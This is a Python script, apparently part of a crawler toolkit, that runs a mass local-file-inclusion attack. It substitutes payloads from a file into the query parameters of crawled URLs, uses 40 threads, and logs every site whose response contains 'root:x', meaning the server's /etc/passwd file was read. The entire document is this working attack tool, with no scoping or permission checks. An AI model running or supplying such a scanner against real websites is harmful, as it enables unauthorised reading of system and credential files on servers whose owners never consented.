import requests
from concurrent.futures import ThreadPoolExecutor
import os
threads = 40
pattern = 'root:x'
base_path=os.path.dirname(os.path.abspath(__file__))
input_file = os.path.join(os.path.dirname(base_path),"crawler",'links.txt')
output_file = os.path.join(base_path,'found.txt')
payload_file = os.path.join(base_path,'payload.txt')
payloads = open(payload_file, mode='r', encoding='utf-8').read().split('\n')
timeout = 30

def changeNCheck(link):
    if link == "":
        return
    if '=' not in link:
        return
    link_temp = link.split('=')[0]
    for payload in payloads:
        link = link_temp + '=' + payload
        try:
            headers = {
                'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36'
            }
            resp = requests.get(link, headers=headers, timeout=timeout).text
            if pattern in resp:
                with open(output_file, mode='a+', encoding='utf-8') as f:
                    f.write(link + "\n")
                print("Valid: {}".format(link))
            else:
                continue          #print("Invalid: {}".format(link))
        except:
            print("Can't open {}".format(link))


def lfi_scanner():
    links = open(input_file, mode='r', encoding='utf-8').read().split('\n')
    with ThreadPoolExecutor(max_workers=threads) as pool:
        pool.map(changeNCheck, links)

if __name__=="__main__":
    lfi_scanner()

